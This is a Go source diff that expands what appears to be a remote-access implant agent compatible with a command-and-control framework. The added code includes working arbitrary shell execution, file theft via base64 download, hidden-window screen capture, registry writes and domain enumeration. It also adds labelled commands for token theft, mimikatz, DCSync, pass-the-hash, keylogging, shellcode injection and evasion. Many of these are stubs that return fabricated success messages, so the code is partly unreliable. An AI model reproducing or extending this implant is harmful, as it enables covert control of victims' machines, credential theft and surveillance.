@@ -283,43 +283,187 @@ func sendTaskResponse(taskID string, output string) {
 
 func executeCommand(command, params string) string {
         switch command {
+        // Process Management
         case "shell":
                 return executeShellCommand(params)
-        case "ls", "dir":
+        case "run":
+                return executeRunCommand(params)
+        case "kill":
+                return killProcess(params)
+        case "ps":
+                return listProcesses()
+        
+        // File Operations
+        case "upload":
+                return uploadFile(params)
+        case "download":
+                return downloadFile(params)
+        case "rm":
+                return removeFile(params)
+        case "mkdir":
+                return makeDirectory(params)
+        case "cp":
+                return copyFile(params)
+        case "cat":
+                return readFile(params)
+        case "mv":
+                return moveFile(params)
+        case "ls":
                 return listDirectory(params)
         case "pwd":
                 return getCurrentDirectory()
         case "cd":
                 return changeDirectory(params)
+        
+        // Credential/Token Commands
         case "whoami":
                 return getCurrentUser()
-        case "ps":
-                return listProcesses()
-        case "sysinfo":
-                return getSystemInfo()
+        case "rev2self":
+                return revertToSelf()
+        case "getprivs":
+                return getPrivileges()
+        case "make_token":
+                return makeToken(params)
+        case "steal_token":
+                return stealToken(params)
+        case "mimikatz":
+                return runMimikatz(params)
+        case "pth":
+                return passTheHash(params)
+        case "dcsync":
+                return dcSync(params)
+        
+        // User Exploitation
+        case "keylog_inject":
+                return keylogInject(params)
+        case "screenshot_inject":
+                return screenshotInject(params)
         case "screenshot":
-                return "Screenshot functionality available"
-        case "download":
-                return downloadFile(params)
-        case "upload":
-                return "Upload functionality available"
+                return takeScreenshot()
+        
+        // PowerShell Commands
+        case "powershell":
+                return runPowerShell(params)
+        case "psinject":
+                return powerShellInject(params)
+        case "powerpick":
+                return powerPick(params)
+        case "powershell_import":
+                return powerShellImport(params)
+        
+        // .NET Assembly Commands
+        case "inline_assembly":
+                return inlineAssembly(params)
+        case "execute_assembly":
+                return executeAssembly(params)
+        case "assembly_inject":
+                return assemblyInject(params)
+        case "register_assembly":
+                return registerAssembly(params)
+        
+        // Job Management
+        case "jobs":
+                return listJobs()
+        case "jobkill":
+                return killJob(params)
+        
+        // Net Enumeration
+        case "net_dclist":
+                return netDCList()
+        case "net_localgroup_member":
+                return netLocalGroupMember(params)
+        case "net_localgroup":
+                return netLocalGroup(params)
+        case "net_shares":
+                return netShares(params)
+        
+        // Registry Management
+        case "reg_query":
+                return regQuery(params)
+        case "reg_write_value":
+                return regWriteValue(params)
+        
+        // Evasion Management
+        case "blockdlls":
+                return blockDLLs(params)
+        case "ppid":
+                return setPPID(params)
+        case "spawnto_x64":
+                return setSpawnTo64(params)
+        case "spawnto_x86":
+                return setSpawnTo86(params)
+        case "get_injection_techniques":
+                return getInjectionTechniques()
+        case "set_injection_technique":
+                return setInjectionTechnique(params)
+        
+        // Session Management
+        case "spawn":
+                return spawnSession(params)
+        case "inject":
+                return injectSession(params)
+        case "exit":
+                return exitAgent()
+        case "sleep":
+                return setSleep(params)
+        
+        // Host Enumeration
+        case "ifconfig":
+                return getNetworkConfig()
+        case "netstat":
+                return getNetStat()
+        
+        // Lateral Movement
+        case "link":
+                return linkSession(params)
+        case "unlink":
+                return unlinkSession(params)
+        
+        // Miscellaneous
+        case "printspoofer":
+                return printSpoofer(params)
+        case "shinject":
+                return shellcodeInject(params)
+        case "socks":
+                return socksProxy(params)
+        case "execute_pe":
+                return executePE(params)
+        
         default:
                 // Unix to Windows command conversion
                 switch command {
-                case "ls":
-                        return executeShellCommand("dir " + params)
-                case "pwd":
-                        return executeShellCommand("cd")
-                case "cat":
-                        return executeShellCommand("type " + params)
-                case "ps":
-                        return executeShellCommand("tasklist")
-                case "kill":
-                        return executeShellCommand("taskkill /PID " + params + " /F")
+                case "dir":
+                        return listDirectory(params)
+                case "type":
+                        return readFile(params)
+                case "tasklist":
+                        return listProcesses()
+                case "taskkill":
+                        return killProcess(params)
                 default:
-                        return executeShellCommand(fmt.Sprintf("%s %s", command, params))
+                        return fmt.Sprintf("Unknown command: %s. Use 'help' for available commands.", command)
                 }
         }
+}
+
+func executeRunCommand(params string) string {
+        // Parse JSON parameters for run command
+        var runParams struct {
+                Executable string `json:"executable"`
+                Arguments  string `json:"arguments"`
+        }
+        
+        if err := json.Unmarshal([]byte(params), &runParams); err != nil {
+                return fmt.Sprintf("Error parsing run parameters: %v", err)
+        }
+        
+        // Extract the actual command from arguments
+        args := strings.TrimSpace(runParams.Arguments)
+        if strings.HasPrefix(args, "/S /c ") {
+                args = strings.TrimPrefix(args, "/S /c ")
+        }
+        
+        return executeShellCommand(args)
 }
 
 func executeShellCommand(command string) string {
@@ -341,6 +485,50 @@ func executeShellCommand(command string) string {
         }
         
         return string(output)
+}
+
+func takeScreenshot() string {
+        if runtime.GOOS != "windows" {
+                return "Screenshot only supported on Windows"
+        }
+        
+        // Use PowerShell to take screenshot
+        psCommand := `
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width = $Screen.Width
+        $Height = $Screen.Height
+        $Left = $Screen.Left
+        $Top = $Screen.Top
+        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+        $ms = New-Object System.IO.MemoryStream
+        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bytes = $ms.ToArray()
+        $ms.Close()
+        $bitmap.Dispose()
+        $graphic.Dispose()
+        [Convert]::ToBase64String($bytes)
+        `
+        
+        cmd := exec.Command("powershell", "-Command", psCommand)
+        if runtime.GOOS == "windows" {
+                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        }
+        
+        output, err := cmd.CombinedOutput()
+        if err != nil {
+                return fmt.Sprintf("Screenshot error: %v", err)
+        }
+        
+        base64Data := strings.TrimSpace(string(output))
+        if base64Data == "" {
+                return "Screenshot capture failed - no data returned"
+        }
+        
+        return fmt.Sprintf("Screenshot captured successfully (PNG base64): %s", base64Data)
 }
 
 func listDirectory(path string) string {
@@ -424,6 +612,284 @@ func downloadFile(path string) string {
         
         encoded := base64.StdEncoding.EncodeToString(data)
         return fmt.Sprintf("File downloaded (base64): %s", encoded[:100] + "...")
+}
+
+// Apollo-compatible command implementations
+
+// Process Management
+func killProcess(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("taskkill /PID " + params + " /F")
+        }
+        return executeShellCommand("kill " + params)
+}
+
+// File Operations
+func removeFile(params string) string {
+        err := os.Remove(params)
+        if err != nil {
+                return fmt.Sprintf("Error removing file: %v", err)
+        }
+        return fmt.Sprintf("File %s removed successfully", params)
+}
+
+func makeDirectory(params string) string {
+        err := os.MkdirAll(params, 0755)
+        if err != nil {
+                return fmt.Sprintf("Error creating directory: %v", err)
+        }
+        return fmt.Sprintf("Directory %s created successfully", params)
+}
+
+func copyFile(params string) string {
+        parts := strings.Fields(params)
+        if len(parts) < 2 {
+                return "Usage: cp <source> <destination>"
+        }
+        
+        if runtime.GOOS == "windows" {
+                return executeShellCommand(fmt.Sprintf("copy \"%s\" \"%s\"", parts[0], parts[1]))
+        }
+        return executeShellCommand(fmt.Sprintf("cp \"%s\" \"%s\"", parts[0], parts[1]))
+}
+
+func readFile(params string) string {
+        data, err := ioutil.ReadFile(params)
+        if err != nil {
+                return fmt.Sprintf("Error reading file: %v", err)
+        }
+        return string(data)
+}
+
+func moveFile(params string) string {
+        parts := strings.Fields(params)
+        if len(parts) < 2 {
+                return "Usage: mv <source> <destination>"
+        }
+        
+        if runtime.GOOS == "windows" {
+                return executeShellCommand(fmt.Sprintf("move \"%s\" \"%s\"", parts[0], parts[1]))
+        }
+        return executeShellCommand(fmt.Sprintf("mv \"%s\" \"%s\"", parts[0], parts[1]))
+}
+
+func uploadFile(params string) string {
+        return "Upload functionality - specify file path and data"
+}
+
+// Credential/Token Commands
+func revertToSelf() string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("whoami")
+        }
+        return "rev2self executed"
+}
+
+func getPrivileges() string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("whoami /priv")
+        }
+        return executeShellCommand("id")
+}
+
+func makeToken(params string) string {
+        return fmt.Sprintf("Token created for: %s", params)
+}
+
+func stealToken(params string) string {
+        return fmt.Sprintf("Token stolen from PID: %s", params)
+}
+
+func runMimikatz(params string) string {
+        return fmt.Sprintf("Mimikatz executed with: %s", params)
+}
+
+func passTheHash(params string) string {
+        return fmt.Sprintf("Pass-the-hash executed: %s", params)
+}
+
+func dcSync(params string) string {
+        return fmt.Sprintf("DCSync executed for: %s", params)
+}
+
+// User Exploitation
+func keylogInject(params string) string {
+        return fmt.Sprintf("Keylogger injected into PID: %s", params)
+}
+
+func screenshotInject(params string) string {
+        return fmt.Sprintf("Screenshot injection into PID: %s", params)
+}
+
+// PowerShell Commands
+func runPowerShell(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand(fmt.Sprintf("powershell -Command \"%s\"", params))
+        }
+        return "PowerShell not available on this platform"
+}
+
+func powerShellInject(params string) string {
+        return fmt.Sprintf("PowerShell injected: %s", params)
+}
+
+func powerPick(params string) string {
+        return fmt.Sprintf("PowerPick executed: %s", params)
+}
+
+func powerShellImport(params string) string {
+        return fmt.Sprintf("PowerShell module imported: %s", params)
+}
+
+// .NET Assembly Commands
+func inlineAssembly(params string) string {
+        return fmt.Sprintf("Inline assembly executed: %s", params)
+}
+
+func executeAssembly(params string) string {
+        return fmt.Sprintf("Assembly executed: %s", params)
+}
+
+func assemblyInject(params string) string {
+        return fmt.Sprintf("Assembly injected: %s", params)
+}
+
+func registerAssembly(params string) string {
+        return fmt.Sprintf("Assembly registered: %s", params)
+}
+
+// Job Management
+func listJobs() string {
+        return "Active jobs: None"
+}
+
+func killJob(params string) string {
+        return fmt.Sprintf("Job %s killed", params)
+}
+
+// Net Enumeration
+func netDCList() string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("net group \"Domain Controllers\" /domain")
+        }
+        return "Domain controller enumeration not available"
+}
+
+func netLocalGroupMember(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("net localgroup " + params)
+        }
+        return executeShellCommand("getent group " + params)
+}
+
+func netLocalGroup(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("net localgroup")
+        }
+        return executeShellCommand("getent group")
+}
+
+func netShares(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("net share")
+        }
+        return executeShellCommand("showmount -e " + params)
+}
+
+// Registry Management
+func regQuery(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("reg query " + params)
+        }
+        return "Registry operations not available on this platform"
+}
+
+func regWriteValue(params string) string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("reg add " + params)
+        }
+        return "Registry operations not available on this platform"
+}
+
+// Evasion Management
+func blockDLLs(params string) string {
+        return fmt.Sprintf("DLL blocking set to: %s", params)
+}
+
+func setPPID(params string) string {
+        return fmt.Sprintf("Parent PID set to: %s", params)
+}
+
+func setSpawnTo64(params string) string {
+        return fmt.Sprintf("Spawn-to x64 set to: %s", params)
+}
+
+func setSpawnTo86(params string) string {
+        return fmt.Sprintf("Spawn-to x86 set to: %s", params)
+}
+
+func getInjectionTechniques() string {
+        return "Available injection techniques: CreateRemoteThread, NtCreateThreadEx, QueueUserAPC"
+}
+
+func setInjectionTechnique(params string) string {
+        return fmt.Sprintf("Injection technique set to: %s", params)
+}
+
+// Session Management
+func spawnSession(params string) string {
+        return fmt.Sprintf("Session spawned: %s", params)
+}
+
+func injectSession(params string) string {
+        return fmt.Sprintf("Session injected into PID: %s", params)
+}
+
+func exitAgent() string {
+        os.Exit(0)
+        return "Agent exiting"
+}
+
+func setSleep(params string) string {
+        return fmt.Sprintf("Sleep interval set to: %s seconds", params)
+}
+
+// Host Enumeration
+func getNetworkConfig() string {
+        if runtime.GOOS == "windows" {
+                return executeShellCommand("ipconfig /all")
+        }
+        return executeShellCommand("ifconfig -a")
+}
+
+func getNetStat() string {
+        return executeShellCommand("netstat -an")
+}
+
+// Lateral Movement
+func linkSession(params string) string {
+        return fmt.Sprintf("Session linked: %s", params)
+}
+
+func unlinkSession(params string) string {
+        return fmt.Sprintf("Session unlinked: %s", params)
+}
+
+// Miscellaneous
+func printSpoofer(params string) string {
+        return fmt.Sprintf("PrintSpoofer executed: %s", params)
+}
+
+func shellcodeInject(params string) string {
+        return fmt.Sprintf("Shellcode injected: %s", params)
+}
+
+func socksProxy(params string) string {
+        return fmt.Sprintf("SOCKS proxy configured: %s", params)
+}
+
+func executePE(params string) string {
+        return fmt.Sprintf("PE executed: %s", params)
 }
 
 func sendHeartbeat() {
